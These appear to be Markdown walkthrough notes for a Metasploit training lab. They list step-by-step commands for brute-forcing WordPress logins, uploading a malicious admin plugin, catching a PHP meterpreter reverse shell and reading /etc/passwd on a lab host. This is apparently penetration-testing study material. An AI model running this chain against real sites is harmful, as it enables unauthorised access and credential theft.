# METASPLOIT

### Challenge 1: 

1. Lab Access! 

<link>

### Challenge 2: Configure Metasploit & Import Scan Results

1. Setup metasploit 

`msfconsole` 

`yes` 

`yes`

* Enter through username and password

2. Create workspace

`workspace -a ps-lab`

`workspace ps-lab’ 

3. Import Nmap results

`db_import /home/ubuntu/lab/challenge2/ps-meta-nmap.xml`

4. Check hosts and services

`hosts`

`services`

5. Globally set RHOSTS to our target with open port

`services -c name,state,port -p 80 -S open -R` 


### Challenge 3: Scan HTTP services 

1. Request HTTP Headers

`search auxiliary/scanner/http header`

`use 5`

`options`

`run`

2.  msfcrawler

`search crawler`

`use auxiliary/crawler/msfcrawler` or `use 0`

`options`

3. Turn on output results:

`spool msfcrawleroutput.log`

`run` 

`spool off`

4. View and analyze results 

`cat msfcrawler-output.log | more`

5. wordpress login module

`search wordpress login`

`use auxiliary/scanner/http/wordpress_login_enum`

`options`

`set PASS_FILE lab/challenge3/password_list.txt`

`set USER_FILE lab/challenge3/username_list.txt`

`run`

Valid Creds! Congratulations!
**TAKE NOTES!!**

### Challenge 4: Create a Reverse Shell Payload

1. WP Admin Shell 

`search wordpress admin`

`use unix/webapp/wp_admin_shell_upload`

`options` 

`creds`

`set USERNAME admin`

`set PASSWORD admin`

2. Set a port, we don’t want the default 4444. 

`services` 

`set LPORT 8080`

`exploit`

WATCH CLOSELY! 

### Challenge 5: Run Exploit to Achieve Shell

1. Dig into how the exploit executed

`show advanced`

`set VERBOSE true`

`exploit`

2. Run tcpdump in the background to get more information. 

`screen -t tcpdump`

`sudo tcpdump -XXX -nn port 80 -w admin-shell.pcap`

`ctrl a` `d` to detach

`exploit` 

`screen -r`

3. View and Analyze results. Find Plugin name

`cat admin-shell.pcap | grep -a -A 25 HTTP | more`


4. Find the full plugin name
`cat admin-shell.pcap | grep - a <insert payload text characters ex. PmmugSpMdx>`

should be a similar format to this: PmmugSpMdx/Fg0uJkDFbQ.php 

5. Hey Google! What's the wordpress login folder structure? 

![de4c58e5-b61f-48fb-bcd4-f6902b1113d2_picture37 (1)](https://user-images.githubusercontent.com/71228729/167345707-6bf4e1a0-f75d-4618-9109-75574d55be41.png)


6. Set up a listener

`use multi/handler`

`options`

`set LPORT 8080`

`set LHOST 0.0.0.0`

`set PAYLOAD php/meterpreter/reverse_tcp`

7. Run the exploit in the background as a job to continue to use the console. 

`run -j`

`Enter` gets the console back 

8. Run curl to retrieve the payload. 
`curl http://172.31.37.55/wp-content/plugins/<payload_folder>/<second_file_name>.php`

Example: `curl http://172.31.37.55/wp-content/plugins/PmmugSpMdx/FgOuJkDFbQ.php`

SUCCESS!!! You now have a meterpreter shell. 

`ctrl + c` exit the display to background job 

`sessions` to list out active sessions

`sessions -i 1` gives you an interactive session 

Try a few things here: `ls`, `pwd`, `cat /etc/passwd`

You have now exploited and gained access to the system in TWO different ways. **Hacker status achieved.**
